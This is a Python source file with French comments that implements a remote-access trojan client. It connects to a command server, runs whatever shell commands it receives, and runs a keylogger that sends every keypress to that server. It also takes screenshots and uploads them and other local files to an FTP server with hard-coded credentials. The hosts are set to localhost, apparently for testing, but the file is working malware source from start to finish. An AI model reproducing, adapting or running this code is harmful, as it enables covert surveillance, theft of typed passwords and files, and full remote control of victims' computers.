import socket
import subprocess
import threading
import os
import shlex
import time
import keyboard  # Module pour intercepter les touches
from ftplib import FTP
import io
try:
    from PIL import ImageGrab
except ImportError:
    # Pour Windows, Pillow doit être installé
    raise ImportError("Veuillez installer Pillow (pip install Pillow) pour utiliser la capture d'écran.")

# Configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5000
FTP_HOST = '127.0.0.1'      # Adresse du serveur FTP (à ajuster si besoin)
FTP_PORT = 2121
FTP_USER = 'user'
FTP_PASS = '12345'

keylogger_running = False

def send_data_to_server(data, host=SERVER_HOST, port=SERVER_PORT):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.sendall(data.encode('utf-8'))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def on_key_press(event):
    with open("key_log.txt", "a") as f:
        f.write(event.name + "\n")
    send_data_to_server(event.name)

def start_keylogger():
    keyboard.on_press(on_key_press)
    keyboard.wait("esc")

def execute_command(command_line):
    global keylogger_running
    command_line = command_line.strip()
    try:
        tokens = shlex.split(command_line)
    except Exception as e:
        return f"Erreur lors du parsing de la commande: {e}"
    
    if not tokens:
        return "Commande vide"
    
    cmd = tokens[0].strip().lower()
    
    if cmd == "ftp_upload":
        if len(tokens) < 3:
            return "Usage: ftp_upload <chemin_local> <nom_remote>"
        local_file = tokens[1]
        remote_file = tokens[2]
        try:
            ftp = FTP()
            ftp.connect(FTP_HOST, FTP_PORT)
            ftp.login(FTP_USER, FTP_PASS)
            with open(local_file, "rb") as f:
                ftp.storbinary(f"STOR {remote_file}", f)
            ftp.quit()
            return f"Fichier {local_file} uploadé en tant que {remote_file} sur le serveur FTP"
        except Exception as e:
            return f"Erreur lors de l'upload FTP: {e}"
    
    elif cmd == "ftp_download":
        if len(tokens) < 3:
            return "Usage: ftp_download <nom_remote> <chemin_destination>"
        remote_file = tokens[1]
        local_file = tokens[2]
        try:
            ftp = FTP()
            ftp.connect(FTP_HOST, FTP_PORT)
            ftp.login(FTP_USER, FTP_PASS)
            with open(local_file, "wb") as f:
                ftp.retrbinary(f"RETR {remote_file}", f.write)
            ftp.quit()
            return f"Fichier {remote_file} téléchargé depuis le serveur FTP et enregistré en {local_file}"
        except Exception as e:
            return f"Erreur lors du téléchargement FTP: {e}"
    
    elif cmd == "keylogger":
        if not keylogger_running:
            keylogger_running = True
            t = threading.Thread(target=start_keylogger, daemon=True)
            t.start()
            return "Keylogger démarré. Il enverra les touches au serveur jusqu'à ce que 'esc' soit pressée."
        else:
            return "Keylogger déjà en cours d'exécution."
    
    elif cmd == "keylogger_stats":
        try:
            if os.path.exists("key_log.txt"):
                with open("key_log.txt", "r") as f:
                    keys = f.readlines()
                count = len(keys)
                last_keys = "".join(keys[-10:]).strip()
                return f"Keylogger stats: {count} touches. Dernières touches: {last_keys}"
            else:
                return "Keylogger stats: Aucun fichier key_log.txt trouvé."
        except Exception as e:
            return f"Erreur lors de la récupération des stats du keylogger: {e}"
    
    elif cmd == "screenshot":
        try:
            # Petite pause pour laisser le temps à l'écran de se stabiliser
            time.sleep(0.5)
            # Capture d'écran et chargement complet de l'image
            image = ImageGrab.grab()
            image.load()  # Force le chargement complet de l'image
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            image.save(filename, format="PNG")
            
            # Upload FTP du screenshot
            ftp = FTP()
            ftp.connect(FTP_HOST, FTP_PORT)
            ftp.login(FTP_USER, FTP_PASS)
            with open(filename, "rb") as f:
                ftp.storbinary(f"STOR {filename}", f)
            ftp.quit()
            
            return f"Screenshot capturée et uploadée sous {filename}"
        except Exception as e:
            return f"Erreur lors de la capture/upload du screenshot: {e}"
    
    else:
        try:
            result = subprocess.run(command_line, shell=True, capture_output=True, text=True)
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return f"Erreur lors de l'exécution de la commande: {e}"

def listen_for_commands(client_socket):
    while True:
        try:
            data = client_socket.recv(16384)
            if not data:
                break
            command_line = data.decode('utf-8', errors='replace').strip()
            result = execute_command(command_line)
            client_socket.sendall(result.encode('utf-8'))
        except Exception as e:
            break

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_HOST, SERVER_PORT))
    threading.Thread(target=listen_for_commands, args=(client_socket,), daemon=True).start()
    while True:
        pass

if __name__ == "__main__":
    main()
